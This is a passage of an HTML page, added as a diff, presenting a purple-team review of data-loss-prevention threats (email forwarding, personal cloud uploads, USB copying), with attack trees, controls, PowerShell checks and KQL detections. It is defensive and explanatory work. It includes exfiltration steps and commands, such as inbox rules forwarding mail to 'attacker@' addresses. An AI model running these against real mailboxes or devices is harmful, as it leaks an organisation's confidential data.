@@ -1,0 +1,1727 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DLP for Hybrid Workforce — Threat Exploitation and Blue-Team Control Review</title>
+
+  <!-- Mermaid JS (CDN). Render lazily so very large pages stay scrollable. -->
+  <script type="module">
+    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+    mermaid.initialize({ startOnLoad: false, theme: 'neutral' });
+
+    function renderMermaidBlock(el) {
+      if (el.dataset.mermaidState) return;
+      el.dataset.mermaidState = 'rendering';
+      mermaid.run({ nodes: [el] })
+        .then(function () {
+          el.dataset.mermaidState = 'rendered';
+        })
+        .catch(function (err) {
+          el.dataset.mermaidState = 'error';
+          el.classList.add('mermaid-error');
+          console.error('Mermaid render failed:', err);
+        });
+    }
+
+    function initMermaidLazyRender() {
+      var blocks = Array.prototype.slice.call(document.querySelectorAll('.mermaid'));
+      if (!blocks.length) return;
+
+      if ('IntersectionObserver' in window) {
+        var observer = new IntersectionObserver(function (entries) {
+          entries.forEach(function (entry) {
+            if (!entry.isIntersecting) return;
+            observer.unobserve(entry.target);
+            renderMermaidBlock(entry.target);
+          });
+        }, { rootMargin: '800px 0px', threshold: 0.01 });
+
+        blocks.forEach(function (block) {
+          observer.observe(block);
+        });
+      } else {
+        var index = 0;
+        function renderBatch() {
+          blocks.slice(index, index + 8).forEach(renderMermaidBlock);
+          index += 8;
+          if (index < blocks.length) window.setTimeout(renderBatch, 50);
+        }
+        renderBatch();
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initMermaidLazyRender);
+    } else {
+      initMermaidLazyRender();
+    }
+  </script>
+
+  <!-- Syntax highlighting (optional, no build step required) -->
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <style>
+    *  { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      line-height: 1.7;
+      color: #24292f;
+      background: #fff;
+    }
+
+    /* Typography */
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.6em;
+      margin-bottom: 0.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      font-weight: 600;
+    }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    a { color: #0969da; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* Code */
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    code {
+      background: #f6f8fa;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.9em;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+      border-radius: 0;
+    }
+
+    /* Tables */
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 16px 0;
+      font-size: 0.92em;
+    }
+    th, td {
+      border: 1px solid #d0d7de;
+      padding: 8px 14px;
+      text-align: left;
+      vertical-align: top;
+    }
+    th {
+      background: #f6f8fa;
+      font-weight: 600;
+    }
+    tr:nth-child(even) { background: #f9f9f9; }
+
+    /* Blockquotes */
+    blockquote {
+      border-left: 4px solid #d0d7de;
+      margin: 0 0 16px 0;
+      padding: 8px 16px;
+      color: #57606a;
+      background: #f6f8fa;
+      border-radius: 0 6px 6px 0;
+    }
+
+    /* Mermaid diagrams */
+    .mermaid {
+      background: #fafbfc;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 20px;
+      margin: 20px 0;
+      overflow-x: auto;
+      text-align: center;
+    }
+    pre.mermaid {
+      white-space: pre;
+    }
+    .mermaid svg {
+      max-width: 100%;
+      height: auto;
+    }
+    .mermaid[data-mermaid-state="rendering"] {
+      min-height: 140px;
+    }
+    .mermaid-error {
+      text-align: left;
+      color: #57606a;
+    }
+
+    /* Images */
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      margin: 14px 0;
+      border: 1px solid #d0d7de;
+      background: #fff;
+      cursor: zoom-in;
+      display: block;
+    }
+
+    /* ── Image zoom overlay ─────────────────────────────── */
+    #img-zoom-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.82);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    #img-zoom-overlay.active { display: flex; }
+    #img-zoom-wrap {
+      position: relative;
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: grab;
+    }
+    #img-zoom-wrap.dragging { cursor: grabbing; }
+    #img-zoom-el {
+      max-width: none;
+      max-height: none;
+      border: none;
+      margin: 0;
+      border-radius: 4px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.6);
+      transform-origin: center center;
+      user-select: none;
+      pointer-events: none;
+    }
+    #img-zoom-controls {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      background: rgba(20,20,20,0.88);
+      padding: 7px 18px;
+      border-radius: 24px;
+      z-index: 10000;
+    }
+    #img-zoom-controls button {
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.1em;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.15s;
+    }
+    #img-zoom-controls button:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-level {
+      color: #ccc;
+      font-size: 0.82em;
+      min-width: 46px;
+      text-align: center;
+      font-family: monospace;
+    }
+    #img-zoom-close {
+      position: fixed;
+      top: 16px;
+      right: 20px;
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.3em;
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      transition: background 0.15s;
+    }
+    #img-zoom-close:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-hint {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: rgba(200,200,200,0.7);
+      font-size: 0.76em;
+      font-family: -apple-system, sans-serif;
+      z-index: 10000;
+      pointer-events: none;
+    }
+
+    /* Breadcrumb / path */
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 24px;
+      font-family: monospace;
+    }
+
+    /* Horizontal rule */
+    hr { border: none; border-top: 2px solid #d0d7de; margin: 24px 0; }
+  </style>
+</head>
+<body>
+  <p class="file-path">Source: scenarios\scenario_based\scenario_answer\scenario7-dlp-hybrid-workforce-Attack-Review-Enhanced.md</p>
+<h1 id="dlp-for-hybrid-workforce-threat-exploitation-and-blue-team-control-review">DLP for Hybrid Workforce — Threat Exploitation and Blue-Team Control Review</h1>
+<p><strong>Source file reviewed:</strong> <code>scenario7-dlp-hybrid-workforce.md</code><br />
+<strong>Generated artifact:</strong> <code>scenario7-dlp-hybrid-workforce-Attack-Review-Enhanced.md</code><br />
+<strong>Reviewer role:</strong> Cybersecurity Architect / Engineer Lead — 15+ years purple-team experience<br />
+<strong>Scenario:</strong> Deploy a multi-channel DLP program protecting PII, financial data, and IP for 25,000 hybrid employees across email, endpoints, and cloud storage — with insider and compromised-account exfiltration as the primary threat actors.</p>
+<hr />
+<h2 id="1-review-objective">1. Review Objective</h2>
+<p>This document reviews the threat model from two lenses:</p>
+<ol>
+<li><strong>Attacker lens:</strong> How an attacker would realistically exploit each identified threat, including prerequisites, reconnaissance steps, tool usage, and escalation path.</li>
+<li><strong>Blue-team lens:</strong> What controls must stop or detect the attack, where each control is enforced, and what telemetry proves the control is firing.</li>
+</ol>
+<p>The review focuses on <strong>attack mechanics, prerequisites, command-level purple-team validation examples, detection evidence, and control validation</strong>. Commands use placeholder values and are intended for an owned lab or approved internal purple-team exercise only.</p>
+<hr />
+<h2 id="2-highest-risk-design-decision">2. Highest-Risk Design Decision</h2>
+<p><strong>The single most consequential design decision is whether DLP policy management is controlled through infrastructure-as-code with separation of duties, or through a GUI that any privileged DLP admin can modify without a second approver.</strong></p>
+<p>A DLP admin who controls both the DLP policy engine and the SIEM rules monitoring that engine can silently create exclusions that produce zero incident telemetry — making the entire DLP program blind to targeted exfiltration paths while all audit dashboards appear clean. The safe design requires: (1) all policy changes via Git PR with peer review, (2) GUI set to read-only for production, (3) SIEM ownership independent of the DLP team, and (4) two-person integrity for RESTRICTED-tier policy changes. The dangerous alternative — a single DLP admin team with GUI write access and self-owned alert rules — enables a privileged insider to disable protections for specific users or file types with no observable trace.</p>
+<hr />
+<h2 id="3-attack-tree-legend">3. Attack-Tree Legend</h2>
+<p>Every attack tree uses this convention:</p>
+<ul>
+<li><strong>Red nodes</strong> (<code>:::attack</code>): attacker actions or attacker-controlled state.</li>
+<li><strong>Blue nodes</strong> (<code>:::control</code>): defensive control decision points.</li>
+<li><strong>Green nodes</strong> (<code>:::blocked</code>): attack stopped or materially contained.</li>
+<li><strong>Yellow nodes</strong> (<code>:::impact</code>): business or security impact if the chain succeeds.</li>
+</ul>
+<hr />
+<h2 id="4-executive-threat-summary">4. Executive Threat Summary</h2>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Threat</th>
+<th>Risk</th>
+<th>Primary Evidence Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1</td>
+<td>Email inbox forwarding rule exfiltration</td>
+<td>High likelihood, High impact</td>
+<td>Exchange Online Unified Audit Log — Set-InboxRule action</td>
+</tr>
+<tr>
+<td>T2</td>
+<td>Browser upload to personal cloud storage</td>
+<td>High likelihood, High impact</td>
+<td>CASB upload logs — bytes_uploaded to unsanctioned destination</td>
+</tr>
+<tr>
+<td>T3</td>
+<td>USB removable media exfiltration</td>
+<td>High likelihood, High impact</td>
+<td>Endpoint DLP agent — destination_type = removable_media</td>
+</tr>
+<tr>
+<td>T4</td>
+<td>Encrypted archive creation before transfer</td>
+<td>High likelihood, Medium impact</td>
+<td>Endpoint DLP agent — process 7za.exe/winrar.exe with -p flag</td>
+</tr>
+<tr>
+<td>T5</td>
+<td>AiTM phishing for session cookie</td>
+<td>Medium likelihood, Critical impact</td>
+<td>Azure AD SigninLogs — risk_state = atRisk, device not compliant</td>
+</tr>
+<tr>
+<td>T6</td>
+<td>OAuth app with broad persistent data scopes</td>
+<td>Medium likelihood, High impact</td>
+<td>Azure AD AuditLogs — ConsentToApplication with files.read scope</td>
+</tr>
+<tr>
+<td>T7</td>
+<td>DLP policy tampering by privileged admin</td>
+<td>Medium likelihood, Critical impact</td>
+<td>Purview Compliance Audit Log — ExclusionAdded / RuleDisabled</td>
+</tr>
+<tr>
+<td>T8</td>
+<td>Screenshot and camera capture bypass</td>
+<td>High likelihood, Low impact</td>
+<td>No technical telemetry — policy and physical control only</td>
+</tr>
+<tr>
+<td>T9</td>
+<td>BYOD device exfiltration via authorized SaaS</td>
+<td>High likelihood, High impact</td>
+<td>Entra ID Conditional Access — device compliance = false</td>
+</tr>
+<tr>
+<td>T10</td>
+<td>Auto-classification false negative</td>
+<td>High likelihood, Medium impact</td>
+<td>DLP incident queue — unclassified file transmitted without match</td>
+</tr>
+<tr>
+<td>T11</td>
+<td>Mobile hotspot CASB proxy bypass</td>
+<td>High likelihood, High impact</td>
+<td>CASB roaming client heartbeat — agent_active = false on managed device</td>
+</tr>
+<tr>
+<td>T12</td>
+<td>Post-termination OAuth token reuse</td>
+<td>Medium likelihood, High impact</td>
+<td>IdP OAuth token refresh log joined with HR SCIM termination event</td>
+</tr>
+<tr>
+<td>T13</td>
+<td>CI/CD service account bulk data exfiltration</td>
+<td>Medium likelihood, High impact</td>
+<td>Cloud storage access logs — service_account bulk download</td>
+</tr>
+<tr>
+<td>T14</td>
+<td>Nation-state slow exfiltration below thresholds</td>
+<td>Low likelihood, Critical impact</td>
+<td>UEBA anomaly — 90-day baseline deviation; honeyfile access alert</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="5-overall-end-to-end-attack-tree">5. Overall End-to-End Attack Tree</h2>
+<pre class="mermaid">
+flowchart TD
+    A0[Threat Actor: Insider or Compromised Account]:::attack
+    A0 --> A1[Choose exfiltration channel]:::attack
+    A1 --> A2[Email forwarding rule or bulk cloud download]:::attack
+    A2 --> C1{DLP gateway and CASB inline active?}:::control
+    C1 -->|Yes| B1[Channel blocked and alerted]:::blocked
+    C1 -->|No| A3[Data leaves via unmonitored channel]:::attack
+    A3 --> A4[Compress or encrypt to defeat inspection]:::attack
+    A4 --> C2{Endpoint DLP agent hooks archive process?}:::control
+    C2 -->|Yes| B2[Archive quarantined and analyst alerted]:::blocked
+    C2 -->|No| A5[Opaque archive sent to personal storage]:::attack
+    A5 --> C3{SIEM bulk-download then upload rule fires?}:::control
+    C3 -->|Yes| B3[SOAR revokes session within 30 min]:::blocked
+    C3 -->|No| A6[DLP admin modifies exclusion to create blind spot]:::attack
+    A6 --> C4{IaC auto-revert and CISO alert fires?}:::control
+    C4 -->|Yes| B4[Policy restored within 10 min]:::blocked
+    C4 -->|No| A7[Sustained undetected exfiltration of RESTRICTED data]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h2 id="6-threat-by-threat-technical-review">6. Threat-by-Threat Technical Review</h2>
+<hr />
+<h3 id="t1-email-inbox-forwarding-rule-exfiltration">T1 — Email Inbox Forwarding Rule Exfiltration</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure<br />
+<strong>Risk:</strong> High likelihood, High impact<br />
+<strong>Attacker objective:</strong> Create a persistent inbox rule that silently copies all inbound and outbound email to a personal external mailbox — set once and run indefinitely with no further attacker interaction required.</p>
+<h4 id="how-the-attacker-would-exploit-it">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Attacker has authenticated access to a corporate email account (legitimate insider or compromised via AiTM phishing).</li>
+<li><strong>Step 1:</strong> Use Outlook web app, MAPI/EWS, or Exchange PowerShell to create a forwarding rule: <code>New-InboxRule -ForwardTo attacker@gmail.com -Name "Archive"</code> or via the Outlook rules UI.</li>
+<li><strong>Step 2:</strong> Rule is set weeks or months before resignation/exfiltration event so it runs silently during the dwell period.</li>
+<li><strong>Step 3:</strong> All email containing CONFIDENTIAL attachments, internal discussion of M&amp;A plans, and customer PII is copied to the personal inbox automatically.</li>
+<li><strong>Step 4:</strong> Attacker accesses personal Gmail from a personal device — no corporate telemetry exists for this retrieval step.</li>
+<li><strong>Step 5:</strong> Impact: sustained data loss spanning months; all historical email since rule creation is already exfiltrated before discovery.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> <code>Set-RemoteDomain -AutoForwardEnabled $false</code> applied to all remote domains in Exchange Online — prevents server-side auto-forwarding at the MTA layer regardless of client-set rules.</li>
+<li><strong>Control 2:</strong> Exchange Online Transport Rule: DLP rule blocking outbound email to non-corporate domains when message contains RESTRICTED-labeled attachment or matched PII content classifier.</li>
+<li><strong>Control 3:</strong> Exchange Online Unified Audit Log ingested to SIEM with alert on action = <code>Set-InboxRule</code> where <code>ForwardTo</code> resolves to non-corporate domain within 5 minutes.</li>
+<li><strong>Control 4:</strong> Entra ID Conditional Access requiring phishing-resistant MFA (FIDO2) before accessing Exchange Online to prevent the initial account compromise that enables rule creation.</li>
+<li><strong>Control 5:</strong> SOAR playbook: on inbox forwarding rule alert → auto-execute <code>Remove-InboxRule</code> via Exchange PowerShell within 10 minutes; notify manager and open investigation ticket.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>Exchange Online Unified Audit Log: <code>Operation = New-InboxRule</code> with <code>ForwardTo</code> or <code>ForwardAsAttachmentTo</code> field containing external domain.</li>
+<li>Exchange Online Unified Audit Log: <code>Operation = Set-Mailbox</code> with <code>ForwardingAddress</code> set to external address (different vector but same outcome).</li>
+<li>Message Trace Logs: messages with <code>SCL = -1</code> (bypass spam filter) routed to external addresses indicate rule bypass of transport policies.</li>
+<li>Azure AD Sign-in Logs: authentication events preceding rule creation — useful to confirm whether account was compromised (unfamiliar IP, new device).</li>
+</ul>
+<h4 id="purple-team-validation-commands">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate that external auto-forward is disabled at the tenant level
+# Run in Exchange Online PowerShell (authorized lab tenant only)
+Get-RemoteDomain | Select-Object DomainName, AutoForwardEnabled
+# Expected: AutoForwardEnabled = False for Default remote domain
+</code></pre>
+<pre><code class="language-powershell"># Validate SIEM alert fires — simulate inbox rule creation to external domain
+# (authorized lab only — use a test mailbox, not a production account)
+New-InboxRule -Mailbox &quot;testuser@&lt;lab-tenant&gt;.onmicrosoft.com&quot; `
+  -Name &quot;PurpleTeamTest&quot; `
+  -ForwardTo &quot;attacker@&lt;external-test-domain&gt;.com&quot; `
+  -MoveToFolder $null
+# Confirm: SIEM alert fires within 5 minutes on Set-InboxRule with external ForwardTo
+# Cleanup: Remove-InboxRule -Mailbox testuser -Identity &quot;PurpleTeamTest&quot;
+</code></pre>
+<pre><code class="language-kql">// KQL: Detect inbox forwarding rule creation to external domain
+// Source: OfficeActivity (Exchange Unified Audit Log)
+OfficeActivity
+| where Operation in (&quot;New-InboxRule&quot;, &quot;Set-InboxRule&quot;, &quot;UpdateInboxRules&quot;)
+| where Parameters has &quot;ForwardTo&quot; or Parameters has &quot;ForwardAsAttachmentTo&quot;
+| extend ForwardTarget = extract(&quot;ForwardTo.*?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})&quot;, 1, Parameters)
+| where ForwardTarget !endswith &quot;@&lt;corporate-domain&gt;.com&quot;
+| project TimeGenerated, UserId, ClientIP, ForwardTarget, Parameters
+| order by TimeGenerated desc
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker has authenticated email session]:::attack
+    A1 --> A2[Creates ForwardTo rule to personal Gmail]:::attack
+    A2 --> C1{RemoteDomain AutoForward disabled?}:::control
+    C1 -->|Yes| B1[Server-side forward blocked at MTA]:::blocked
+    C1 -->|No| A3[Rule runs silently for weeks or months]:::attack
+    A3 --> C2{SIEM alert on Set-InboxRule fires within 5 min?}:::control
+    C2 -->|Yes| B2[SOAR removes rule and opens investigation]:::blocked
+    C2 -->|No| A4[All inbound email copied to personal inbox]:::attack
+    A4 --> C3{Transport DLP rule blocks labeled attachments?}:::control
+    C3 -->|Yes| B3[Labeled content blocked but metadata still leaks]:::blocked
+    C3 -->|No| A5[PII and CONFIDENTIAL data fully exfiltrated via email]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t2-browser-upload-to-personal-cloud-storage">T2 — Browser Upload to Personal Cloud Storage</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure<br />
+<strong>Risk:</strong> High likelihood, High impact<br />
+<strong>Attacker objective:</strong> Bulk-upload sensitive files from a managed corporate laptop to personal Dropbox, Google Drive (personal namespace), or WeTransfer using the browser — bypassing any endpoint DLP file-level controls by using the browser as the upload agent.</p>
+<h4 id="how-the-attacker-would-exploit-it_1">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Attacker (insider or compromised user) has access to sensitive files on a managed device and a browser session to a personal cloud storage account.</li>
+<li><strong>Step 1:</strong> Copy or navigate to sensitive files on corporate SharePoint or local disk that contain CONFIDENTIAL or RESTRICTED labeled documents.</li>
+<li><strong>Step 2:</strong> Open personal Dropbox or Google Drive (personal account) in the managed browser; drag and drop files into the upload area.</li>
+<li><strong>Step 3:</strong> If CASB roaming client is absent or the device is connected via mobile hotspot (bypassing corporate proxy), all traffic goes directly to Dropbox/Google without inspection.</li>
+<li><strong>Step 4:</strong> HTTPS upload is encrypted end-to-end — without TLS break-and-inspect at the CASB, content is opaque to all network-layer controls.</li>
+<li><strong>Step 5:</strong> Impact: hundreds of files exfiltrated within minutes from a managed corporate device with no DLP block event generated.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_1">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> Netskope or Microsoft Defender for Cloud Apps inline CASB deployed with TLS break-and-inspect; CA cert pushed via MDM; blocks upload to unsanctioned cloud storage categories (personal Google Drive, Dropbox, WeTransfer, Mega.nz).</li>
+<li><strong>Control 2:</strong> CASB roaming client (Netskope Client or Zscaler App) enforced via Intune — must be running and reporting heartbeat for device to maintain compliant status; Conditional Access blocks access to CONFIDENTIAL SharePoint if roaming client heartbeat is absent.</li>
+<li><strong>Control 3:</strong> DNS category blocking via on-device resolver (Cisco Umbrella roaming or Zscaler DNS) blocking Personal Cloud Storage and File Sharing categories — applies even when not routed through corporate proxy.</li>
+<li><strong>Control 4:</strong> CASB alert: user uploads more than 100MB to any external destination within 60 minutes → Critical SIEM alert and SOAR session review.</li>
+<li><strong>Control 5:</strong> Bulk-download-then-upload correlation rule: SharePoint download &gt; 500MB in 60 min correlated with CASB upload &gt; 200MB to external in 120 min → Critical alert + SOAR auto session revoke.</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_1">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>CASB upload block events: <code>action = blocked</code>, <code>destination_category = Personal Cloud Storage</code>, <code>bytes_attempted</code>, <code>user_email</code>, <code>sha256_content_hash</code>.</li>
+<li>CASB roaming client heartbeat: <code>agent_active = true/false</code> per device per 15-minute interval — alert if managed device shows <code>false</code> for more than 15 minutes.</li>
+<li>SharePoint Unified Audit Log: <code>Operation = FileDownloaded</code> bulk events — correlation anchor for the download side of the exfiltration chain.</li>
+<li>DNS filtering logs: <code>queried_domain = dropbox.com or drive.google.com</code>, <code>action = blocked</code>, <code>category = Personal Cloud Storage</code>.</li>
+</ul>
+<h4 id="purple-team-validation-commands_1">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate CASB roaming client is enforced on all Intune-enrolled devices
+# Run in Microsoft Intune PowerShell (authorized lab)
+Get-MgDeviceManagementManagedDevice -Filter &quot;operatingSystem eq 'Windows'&quot; |
+  Select-Object DeviceName, ComplianceState, LastSyncDateTime |
+  Where-Object { $_.ComplianceState -ne &quot;compliant&quot; }
+# Expected: all managed devices compliant; non-compliant devices trigger Conditional Access block
+</code></pre>
+<pre><code class="language-kql">// KQL: Detect bulk upload to unsanctioned cloud storage via CASB
+// Source: McasShadowItReporting or Netskope logs ingested as custom table
+McasShadowItReporting
+| where ActivityType == &quot;Upload&quot;
+| where AppCategory in (&quot;Personal Cloud Storage&quot;, &quot;File Sharing&quot;, &quot;Anonymous Upload&quot;)
+| summarize TotalBytes = sum(BytesUploaded), UploadCount = count() by UserId, AppName, bin(TimeGenerated, 1h)
+| where TotalBytes &gt; 104857600  // 100MB threshold
+| project TimeGenerated, UserId, AppName, TotalBytes, UploadCount
+| order by TotalBytes desc
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_1">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker opens personal Dropbox in managed browser]:::attack
+    A1 --> A2[Drags CONFIDENTIAL files into browser upload]:::attack
+    A2 --> C1{CASB roaming client active and routing traffic?}:::control
+    C1 -->|Yes| B1[TLS inspected - upload blocked and logged]:::blocked
+    C1 -->|No - hotspot bypass| A3[Traffic routed direct to Dropbox bypassing CASB]:::attack
+    A3 --> C2{DNS category block on personal cloud storage?}:::control
+    C2 -->|Yes| B2[DNS query blocked - browser cannot resolve Dropbox]:::blocked
+    C2 -->|No| A4[Bulk HTTPS upload completes undetected]:::attack
+    A4 --> C3{Bulk-download-then-upload SIEM correlation fires?}:::control
+    C3 -->|Yes| B3[SOAR revokes session and alerts SOC]:::blocked
+    C3 -->|No| A5[Hundreds of files exfiltrated with zero DLP telemetry]:::impact
+
+    classDef attack fill:#ffe6e6,stroke:#cc0000,color:#111;
+    classDef control fill:#e6f2ff,stroke:#0066cc,color:#111;
+    classDef blocked fill:#e8f5e9,stroke:#1b5e20,color:#111;
+    classDef impact fill:#fff3cd,stroke:#b8860b,color:#111;
+</pre>
+<hr />
+<h3 id="t3-usb-removable-media-exfiltration">T3 — USB Removable Media Exfiltration</h3>
+<p><strong>STRIDE category:</strong> Information Disclosure<br />
+<strong>Risk:</strong> High likelihood, High impact<br />
+<strong>Attacker objective:</strong> Copy sensitive files to a USB thumb drive inserted into a managed endpoint — bypassing network-layer controls entirely since no network traffic is generated.</p>
+<h4 id="how-the-attacker-would-exploit-it_2">How the attacker would exploit it</h4>
+<ul>
+<li><strong>Prerequisite:</strong> Attacker has physical access to a managed Windows or macOS endpoint with USB ports enabled and the endpoint DLP agent either absent, excluded, or disabled.</li>
+<li><strong>Step 1:</strong> Insert USB thumb drive; Windows registers a new drive letter via the USB mass storage class driver.</li>
+<li><strong>Step 2:</strong> Copy sensitive files (source code, financial models, HR records) using Explorer, <code>robocopy</code>, or <code>xcopy</code> — file operations occur at the OS file system level.</li>
+<li><strong>Step 3:</strong> If the endpoint DLP agent is absent or the device is excluded from policy (e.g., WFH device enrolled late), the NTFS minifilter driver hook does not intercept the write operation.</li>
+<li><strong>Step 4:</strong> Create an encrypted archive first (7zip with AES-256 password) to defeat any content inspection that might occur at the USB level if the agent does have read-access hooks.</li>
+<li><strong>Step 5:</strong> Walk out or ship the USB device — no network telemetry, no CASB log, no email record.</li>
+</ul>
+<h4 id="blue-team-control-review-what-must-stop-the-chain_2">Blue-team control review — what must stop the chain</h4>
+<ul>
+<li><strong>Control 1:</strong> Microsoft Purview Endpoint DLP or Symantec DLP Endpoint Agent deployed via Intune — kernel-level NTFS minifilter hook blocks write operations to USB device class for CONFIDENTIAL/RESTRICTED files.</li>
+<li><strong>Control 2:</strong> GPO or Intune Device Configuration Profile: <code>Removable storage: All Removable Storage classes: Deny write access</code> — blocks USB writes at the OS class-driver level independent of DLP agent.</li>
+<li><strong>Control 3:</strong> Intune enrollment compliance check: devices without active DLP agent heartbeat are marked non-compliant and blocked from accessing SharePoint CONFIDENTIAL sites via Conditional Access.</li>
+<li><strong>Control 4:</strong> Endpoint DLP agent event: <code>destination_type = removable_media</code>, <code>file_label = CONFIDENTIAL/RESTRICTED</code>, <code>action = blocked</code> — alert to SIEM within 60 seconds.</li>
+<li><strong>Control 5:</strong> Physical security: clean desk policy, badge-controlled sensitive work areas, USB port physical blockers in high-security zones (finance, legal, R&amp;D).</li>
+</ul>
+<h4 id="evidence-and-telemetry-to-validate-controls_2">Evidence and telemetry to validate controls</h4>
+<ul>
+<li>Endpoint DLP agent events: <code>Operation = FileCopiedToRemovableMedia</code>, <code>LabelName</code>, <code>FilePath</code>, <code>DeviceId</code>, <code>user_sid</code>, <code>action_taken = blocked</code>.</li>
+<li>Windows Security Event Log <code>Event ID 4663</code>: Object Access — file written to removable media device; requires object-level auditing enabled via GPO.</li>
+<li>Intune Device Compliance Log: devices reporting DLP agent heartbeat = false — reconcile daily against full device inventory.</li>
+<li>Microsoft Defender for Endpoint: <code>DeviceEvents</code> table — <code>ActionType = UsbDriveMounted</code>, <code>ActionType = FileCreated</code> on removable media device.</li>
+</ul>
+<h4 id="purple-team-validation-commands_2">Purple-team validation commands</h4>
+<pre><code class="language-powershell"># Validate USB write block policy is enforced via Intune Device Configuration
+# Run in Microsoft Intune PowerShell (authorized lab only)
+Get-MgDeviceManagementDeviceConfiguration |
+  Where-Object { $_.DisplayName -like &quot;*USB*&quot; -or $_.DisplayName -like &quot;*Removable*&quot; } |
+  Select-Object DisplayName, LastModifiedDateTime
+</code></pre>
+<pre><code class="language-kql">// KQL: Detect file write attempts to removable media on managed endpoints
+// Source: Microsoft Defender for Endpoint DeviceEvents
+DeviceEvents
+| where ActionType == &quot;UsbDriveMounted&quot; or ActionType in (&quot;FileCreated&quot;,&quot;FileCopied&quot;)
+| where FolderPath startswith &quot;E:\\&quot; or FolderPath startswith &quot;F:\\&quot; or FolderPath startswith &quot;G:\\&quot;
+| join kind=inner (
+    DeviceFileEvents
+    | where FileOriginUrl == &quot;&quot; and FolderPath matches regex @&quot;^[D-Z]:\\&quot;
+  ) on DeviceId, $left.Timestamp == $right.Timestamp
+| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, ActionType
+| order by Timestamp desc
+</code></pre>
+<h4 id="attack-tree-with-control-breakpoints_2">Attack tree with control breakpoints</h4>
+<pre class="mermaid">
+flowchart TD
+    A1[Attacker inserts USB drive into managed laptop]:::attack
+    A1 --> C1{GPO or Intune blocks USB write at driver level?}:::control
+    C1 -->|Yes| B1[USB write denied at OS level - cannot copy files]:::blocked
